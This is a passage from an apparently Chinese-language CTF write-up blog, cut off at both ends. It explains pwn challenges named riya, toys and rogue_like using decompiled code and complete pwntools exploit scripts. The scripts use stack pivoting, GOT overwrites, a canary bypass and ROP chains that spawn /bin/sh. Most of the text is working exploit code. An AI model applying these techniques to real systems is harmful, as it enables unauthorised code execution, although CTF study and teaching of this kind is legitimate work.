class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setvbuf'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040201a</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x000000000010f75b</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'certificate'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x4025E6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'certificate'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="riya"><a href="#riya" class="headerlink" title="riya"></a>riya</h2><p>输入 n 直接跳到 LABEL_10 送 shell</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"y/n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token char">'Y'</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token char">'Y'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>LABEL_10<span class="token operator">:</span>      <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0x3E8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token char">'n'</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_10<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token char">'y'</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_11<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="toys"><a href="#toys" class="headerlink" title="toys"></a>toys</h2><p>这题只有一个栈溢出，还没什么 gadgets</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-80h] BYREF</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"There are no toys here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0x1337</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x80</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Too many!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路：</p><ul><li>由于缺少 pop_rdi_ret 等 gadgets，而且程序中的 puts 输出的都是 rodata 段的数据，而 strlen_len 的参数是 rbp - 0x80，所以需要改 strlen_got 为 puts_plt 去泄露在 rbp - 0x80提前布置好的 libc 地址</li><li>修改 strlen_got 的方法是利用 fgets 向 rbp - 0x80 的位置写，修改 rbp 为 strlen_got + 0x80 再用 fgets 输入就能覆盖 strlen_got 为 puts_plt</li><li>直接把栈迁移到 got 表那块会覆盖到其他有用的地址，所以需要迁移到程序段高地址去写 rop 链，其中一次输入在 strlen_got + 0x80</li></ul><p>exp分析：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>main <span class="token operator">=</span> <span class="token number">0x401274</span>got_addr <span class="token operator">=</span> <span class="token number">0x404000</span>leave_ret <span class="token operator">=</span> <span class="token number">0x00000000004012cd</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>strlen_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span>strlen <span class="token operator">=</span> <span class="token number">0x40128C</span>p <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x80</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x80</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0x98</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>strlen<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0x700</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'OK'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x820</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x830</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x810</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'OK'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'OK'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x88540</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.39/libc.so.6'</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000010f75b</span>p <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'OK'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>p = b&#39;\x00&#39; * 0x80 + p64(got_addr + 0x800) + p64(main)</code></p><p>&#x3D;&gt; rbp &#x3D; got + 0x800</p><p><code>p = b&#39;\x00&#39; * 0x80 + p64(got_addr + 0x100) + p64(main) + p64(strlen_got + 0x80) + p64(main) + p64(strlen_got + 0x98) + p64(strlen) + p64(strlen_got + 0x700) + p64(main)</code></p><p>&#x3D;&gt; rbp &#x3D; got + 0x100</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">got <span class="token operator">+</span> <span class="token number">0x800</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>got <span class="token operator">+</span> <span class="token number">0x810</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0x80</span><span class="token punctuation">)</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>got <span class="token operator">+</span> <span class="token number">0x820</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0x98</span><span class="token punctuation">)</span> p64<span class="token punctuation">(</span>strlen<span class="token punctuation">)</span>got <span class="token operator">+</span> <span class="token number">0x830</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0x700</span><span class="token punctuation">)</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>p = p64(0) + p64(got_addr + 0x820) + p64(leave_ret) + p64(0) + p64(got_addr + 0x830) + p64(leave_ret) p = p.ljust(0x80, b&#39;\x00&#39;) + p64(got_addr + 0x810) + p64(leave_ret)</code></p><p>&#x3D;&gt; rbp &#x3D; got + 0x810</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">got <span class="token operator">+</span> <span class="token number">0x80</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>     p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x820</span><span class="token punctuation">)</span> got <span class="token operator">+</span> <span class="token number">0x90</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>   p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>got <span class="token operator">+</span> <span class="token number">0xa0</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x830</span><span class="token punctuation">)</span>  p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">got <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x810</span><span class="token punctuation">)</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来的程序流： </p><ul><li><p>leave_ret 迁移到 got_addr + 0x818，执行 main</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rbp <span class="token punctuation">:</span> got <span class="token operator">+</span> <span class="token number">0x100</span><span class="token operator">=</span><span class="token operator">></span>got <span class="token operator">+</span> <span class="token number">0x810</span><span class="token operator">=</span><span class="token operator">></span> strlen_got <span class="token operator">+</span> <span class="token number">0x80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>两次 pop rbp 后 rbp 变成 strlen_got + 0x80</p></li><li><p>此时 fgets 就是向 rbp - 0x80 即 strlen_got 读，发送 p64(puts_plt) 即可改 strlen_got 为 puts_plt</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rbp <span class="token punctuation">:</span> strlen_got <span class="token operator">+</span> <span class="token number">0x80</span> <span class="token operator">=</span> got <span class="token operator">+</span> <span class="token number">0x88</span> <span class="token operator">=</span><span class="token operator">></span> got_addr <span class="token operator">+</span> <span class="token number">0x820</span> <span class="token operator">=</span><span class="token operator">></span> strlen_got <span class="token operator">+</span> <span class="token number">0x98</span> <span class="token operator">=</span> got <span class="token operator">+</span> <span class="token number">0xa0</span>ret <span class="token punctuation">:</span> got <span class="token operator">+</span> <span class="token number">0x90</span> <span class="token operator">=</span><span class="token operator">></span> leave_ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>leave_ret 迁移到 rbp + 8 &#x3D; got_addr + 0x828 &#x3D;&gt; strlen，执行 main 中的 strlen，迁移时执行两次 pop rbp 使 rbp 变成 got + 0xa0</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rbp <span class="token punctuation">:</span> got <span class="token operator">+</span> <span class="token number">0xa0</span> <span class="token operator">=</span><span class="token operator">></span> got_addr <span class="token operator">+</span> <span class="token number">0x830</span>ret <span class="token punctuation">:</span> got <span class="token operator">+</span> <span class="token number">0xa8</span> <span class="token operator">=</span><span class="token operator">></span> leave_ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以 strlen 的一参是 rbp - 0x80 &#x3D; got + 0x20 &#x3D; setvbuf_got，而 strlen_got 已经被改成 puts_plt，相当于执行 puts 输出了 setvbuf_got，最后 ret 是 leave_ret</p></li><li><p>再次迁移到 rbp + 8 &#x3D; got_addr + 0x838 &#x3D; main，最后一次利用栈溢出写 rop 链执行 system(‘&#x2F;bin&#x2F;sh’)</p></li></ul><h2 id="rogue-like"><a href="#rogue-like" class="headerlink" title="rogue_like"></a>rogue_like</h2><p>本题有三次选择：</p><p>第一次选择一个武器，有三个选择，case 1 设置 libc 中任意 64 位地址为 0，case 2 写 libc 中任意地址一个 byte，case 3 泄露 &#x2F;proc&#x2F;self&#x2F;maps 中的地址；</p><p>第二次选择一个祝福，case 1 会崩溃，case 2 和 case 3 功能 都是给任意地址加上 5 以内的值；</p><p>第三次选择一个挑战，case 1 溢出 0x10，case 2 输出 0x120 后输入 0xf0，无溢出，case 3 两次 read，一次刚好到 rbp，并且存在栈的 off-by-null</p><p>但是题目开了 canary，所以需要组合三次选择来绕过 canary 并且执行 rop</p><p>思路：第一次选 1，改 tls 中的 canary 为 0，第二次选 2，让 got 表中的 alarm + 5 得到 syscall，第三次选 3，程序中已经有 &#x2F;bin&#x2F;sh，再利用第二次 read 控制 rax 执行 syscall 即可</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013f4</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013f6</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x00000000004013f8</span>ret <span class="token operator">=</span> <span class="token number">0x00000000004007fe</span>binsh <span class="token operator">=</span> <span class="token number">0x00000000004019d7</span>syscall <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'!'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x2568</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'increase.'</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'increase.'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x602058</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x7</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token 